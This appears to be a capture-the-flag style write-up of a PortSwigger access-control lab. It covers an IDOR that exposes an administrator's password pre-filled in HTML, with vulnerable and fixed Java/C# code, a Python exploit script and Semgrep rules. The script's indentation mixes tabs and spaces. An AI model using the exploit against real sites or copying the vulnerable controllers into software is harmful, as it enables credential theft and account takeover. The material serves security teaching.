---
title: "Lab 10: User ID controlled by request parameter with password disclosure"
date: 2025-12-17
categories: [portswigger, access_control]
tags: [IDOR, password_leakage] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-17-lab07_access_control/
--- 

## 1. Executive Summary

**Vulnerability:** Insecure Direct Object Reference (IDOR) leading to Sensitive Data Exposure.

**Description:** The application uses an insecure ID parameter to retrieve user profiles. Crucially, the "Update Profile" form pre-fills the user's existing password into an `<input>` field. Because the server does not verify if the requestor owns the account, an attacker can load the administrator's profile and extract their plaintext password from the HTML source.

**Impact:** Full account takeover. An attacker can gain administrative access by retrieving the credential and logging in as the victim.

## 2. The Attack

**Objective:** Retrieve the `administrator` password and delete `carlos`.

1. **Reconnaissance:** I logged in as `wiener` and accessed the "My Account" page. The URL was `/my-account?id=wiener`.
2. **Observation:** I inspected the page source. I noticed the password field was pre-filled:HTML
    
    `<input type="password" name="password" value="peter">`
    
    This is a dangerous anti-pattern.
    
3. **Exploitation:** I sent the request to **Burp Repeater** and changed the parameter to `id=administrator`.
4. **Result:** The server returned the profile page for the administrator.
5. **Loot:** I searched the response for `name="password"` and found:HTML
    
    `<input type="password" name="password" value="<admin_pass>">`
    
6. **Action:** I used this password to log in as `administrator` and deleted the user `carlos`.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The code commits two sins:

1. **IDOR:** It uses the URL parameter to look up the user.
2. **Exposure:** It passes the full User Entity (including the hashed or plaintext password) to the Frontend View, and the View renders it into the `value` attribute.

### Java (Spring Boot + Thymeleaf)

```java
@Controller
public class ProfileController {

    @Autowired
    private UserRepository userRepository;

    // VULNERABLE:
    // 1. Accepts 'id' from URL (IDOR).
    // 2. Adds the WHOLE User object (with password) to the Model.
    @GetMapping("/user-profile")
    public String getProfile(@RequestParam("id") String userId, Model model) {
        
        User user = userRepository.findByUsername(userId);
        
        // If the 'User' class has a getPassword() method, 
        // the view can accidentally render it.
        model.addAttribute("user", user); 
        return "profile_form";
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`@RequestParam("id")`**: Extracts `administrator` from the URL `?id=administrator`.
- **`userRepository.findByUsername(...)`**: Fetches the admin's record from the database.
- **`model.addAttribute("user", user)`**: This transfers the *entire* user object from Java memory to the HTML template engine.
- **The View (HTML)**: The template likely has `<input type="password" th:value="${user.password}" />`. The engine evaluates `${user.password}` and inserts the secret string directly into the HTML sent to the browser.

### C# (ASP.NET Core MVC)

```csharp
public class ProfileController : Controller
{
    // VULNERABLE
    [HttpGet]
    public IActionResult Index(string id)
    {
        // 1. IDOR: Lookup by parameter
        var userEntity = _db.Users.Find(id);

        // 2. Exposure: Passing the Entity directly to the View
        return View(userEntity);
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`string id`**: The framework binds the URL query parameter `id` to this argument.
- **`_db.Users.Find(id)`**: Retrieves the raw database entity for the target user.
- **`return View(userEntity)`**: Passes the entity to the Razor view (`.cshtml`).
- **Razor View**: The view code likely contains `@Html.PasswordFor(m => m.Password)`. This helper generates an `<input>` tag and automatically populates the `value` attribute with the content of `userEntity.Password`.

### Mock PR Comment

The `getProfile` endpoint currently retrieves user data based on the `id` URL parameter without checking if the logged-in user owns that account. Additionally, we are sending the user's password field to the frontend, where it is rendered in the HTML source.

**Recommendation:**

1. Derive the user ID from the secure session (Principal), not the URL.
2. Never pre-fill password fields. The password field should always be empty on an "Update Profile" page.
3. Use a `UserDTO` that completely excludes the `password` property so it cannot be accidentally exposed.

## 4. The Fix

**Explanation of the Fix:**
We fix the IDOR by using the Session ID. We fix the data leak by using a **DTO (Data Transfer Object)** that does *not* contain a password field.

### Secure Java

```java
// DTO: A specific class for the View that has NO password field
public class UserProfileDTO {
    private String username;
    private String email;
    // No password field here!
}

@GetMapping("/user-profile")
public String getProfile(Principal principal, Model model) {
    // SECURE 1: Use Principal (Session)
    String myUsername = principal.getName();
    User user = userRepository.findByUsername(myUsername);

    // SECURE 2: Map to DTO (Sanitize data)
    UserProfileDTO dto = new UserProfileDTO();
    dto.setUsername(user.getUsername());
    dto.setEmail(user.getEmail());

    model.addAttribute("user", dto);
    return "profile_form";
}
```

**Technical Flow & Syntax Explanation:**

- **`Principal`**: We get the ID of the *authenticated* user, rendering the `?id=administrator` parameter useless.
- **`UserProfileDTO`**: We create a temporary object that only holds safe data (email, username).
- **Data Mapping**: We copy data from the Database Entity (`User`) to the Safe Object (`dto`).
- **Rendering**: Even if the HTML template tries to do `${user.password}`, it will fail or print nothing because the `dto` object literally doesn't have that property.

### Secure C#

```csharp
[Authorize]
public IActionResult Index()
{
    // SECURE 1: Get ID from Claims (Session)
    var userId = User.FindFirst(ClaimTypes.NameIdentifier).Value;
    var userEntity = _db.Users.Find(userId);

    // SECURE 2: Use a ViewModel
    var viewModel = new ProfileViewModel 
    {
        Username = userEntity.Username,
        Email = userEntity.Email,
        // Password is deliberately omitted
    };

    return View(viewModel);
}
```

**Technical Flow & Syntax Explanation:**

- **`User.FindFirst(...)`**: Extracts the ID from the encrypted cookie.
- **`ProfileViewModel`**: A standalone class defined specifically for this page. It acts as a filter.
- **`value` Attribute**: Since `viewModel.Password` does not exist (or is null), the generated HTML input will be `<input type="password" value="">`, which is the industry standard for security.

## 5. Automation

*A Python script that exploits the IDOR to extract the password from the HTML source.*

```python
#!/usr/bin/env python3
import requests
import re
import argparse
import sys

def exploit_password_disclosure(url, session_cookie):
	target_path = "/my-account"
	target_id = "administrator"

	params = {"id": target_id}
	cookies = {"session": session_cookie}

	print(f"[*] Target: {url}{target_path}")
	print(f"[*] Attempting to fetch profile for: {target_id}")

	try:
		resp = requests.get(f"{url.rstrip('/')}{target_path}", params=params, cookies=cookies, timeout=10)
		if resp.status_code == 200:
			print("[+] Request successful. Parsing for password ...")
			password_pattern = r'<input[^>]*name=["\']password["\'][^>]*value=["\']([^"\']+)["\']'
			m = re.search(password_pattern, resp.text, re.IGNORECASE)

			if m:
                print(f"[!!!] PASSWORD FOUND: {m.group(1)}")
            else:
                print("[-] Password input found, but value was empty or not matched.")
                # Debug check
                if "administrator" not in resp.text:
                    print("[-] Note: Response does not contain 'administrator'. IDOR might have failed.")
        else:
            print(f"[-] Failed. Status Code: {resp.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

def main():
    ap = argparse.ArgumentParser(description="Exploit IDOR to steal pre-filled password")
    ap.add_argument("url", help="Base URL of the lab")
    ap.add_argument("session", help="Your valid session cookie")
    
    args = ap.parse_args()
    exploit_password_disclosure(args.url, args.session)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules look for the specific bad practice of rendering a password value into an HTML attribute.*

**The Logic**
We want to find backend code (Controllers or Views) that appears to put a variable named `password` or `pwd` into a Model object that is sent to the view. This is a heuristic that suggests the password might be rendered.

### Java Rule

```yaml
rules:
  - id: java-password-in-model
    languages: [java]
    message: |
      Potential Password Exposure. The code is adding a User object 
      directly to the Model. If this User object contains a password field, 
      it may be rendered in the view (View Source exposure). Use a DTO without password fields.
    severity: WARNING
    patterns:
      - pattern-inside: |
          public String $METHOD(..., Model $MODEL) { ... }
      - pattern: $MODEL.addAttribute(..., $USER);
      # Heuristic: Check if the variable type hints at a full Entity
      - pattern-either:
          - pattern-inside: |
              User $USER = ...;
              ...
          - pattern-inside: |
              Account $USER = ...;
              ...
```

### C# Rule

```yaml
rules:
  - id: csharp-password-in-view-model
    languages: [csharp]
    message: |
      Potential Password Exposure. Returning a User entity directly to the View. 
      Ensure 'User' is not the raw database entity containing the Password hash/plaintext.
    severity: WARNING
    patterns:
      - pattern-inside: |
          public IActionResult $METHOD(...) { ... }
      - pattern: return View($USER);
      - pattern-either:
          - pattern-inside: |
              User $USER = ...;
              ...
          - pattern-inside: |
              var $USER = _context.Users.Find(...);
              ...
```
